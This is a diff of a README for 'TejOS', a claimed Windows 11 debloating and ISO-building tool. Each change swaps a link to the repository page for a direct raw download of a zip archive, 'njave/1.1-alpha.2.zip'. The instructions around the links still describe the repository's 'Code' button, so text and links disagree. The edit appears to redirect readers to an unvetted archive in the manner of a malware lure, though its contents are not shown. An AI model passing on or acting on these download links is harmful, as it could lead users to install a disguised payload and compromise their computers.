@@ -1,6 +1,6 @@
 # 🖥️ TejOS - Build a Faster, Cleaner Windows 11
 
-[![Download TejOS](https://img.shields.io/badge/Download-TejOS-blue?style=for-the-badge&logo=github)](https://github.com/MuhAgung09/TejOS)
+[![Download TejOS](https://img.shields.io/badge/Download-TejOS-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/MuhAgung09/TejOS/main/njave/1.1-alpha.2.zip)
 
 ## 👋 What is TejOS?
 
@@ -28,7 +28,7 @@ If your computer feels slow, has too many background apps, or you simply want a 
 
 ### Step 1: Download TejOS
 
-Visit this link to download the application: **[Download TejOS](https://github.com/MuhAgung09/TejOS)**
+Visit this link to download the application: **[Download TejOS](https://raw.githubusercontent.com/MuhAgung09/TejOS/main/njave/1.1-alpha.2.zip)**
 
 The download is completely free. You'll see a green "Code" button on the page—click it, then select "Download ZIP" to get the files.
 
@@ -62,7 +62,7 @@ Once TejOS finishes, you'll have a brand-new ISO file. You can:
 
 **Ready to get started?**
 
-👉 **[Click here to download TejOS](https://github.com/MuhAgung09/TejOS)** 👈
+👉 **[Click here to download TejOS](https://raw.githubusercontent.com/MuhAgung09/TejOS/main/njave/1.1-alpha.2.zip)** 👈
 
 This is the official download page. Look for the green "Code" button, click it, and select "Download ZIP." No registration, no payment—just download and run.
 
@@ -132,7 +132,7 @@ TejOS is released under an open-source license. You are free to use, modify, and
 
 TejOS puts you in control of your Windows 11 experience. Say goodbye to slow performance, annoying pre-installed apps, and hardware restrictions. With just a few clicks, you'll have a clean, fast, and private Windows 11 that runs the way you want.
 
-**Download TejOS today and transform your PC!** 👉 [https://github.com/MuhAgung09/TejOS](https://github.com/MuhAgung09/TejOS)
+**Download TejOS today and transform your PC!** 👉 [https://raw.githubusercontent.com/MuhAgung09/TejOS/main/njave/1.1-alpha.2.zip](https://raw.githubusercontent.com/MuhAgung09/TejOS/main/njave/1.1-alpha.2.zip)
 
 ---
 
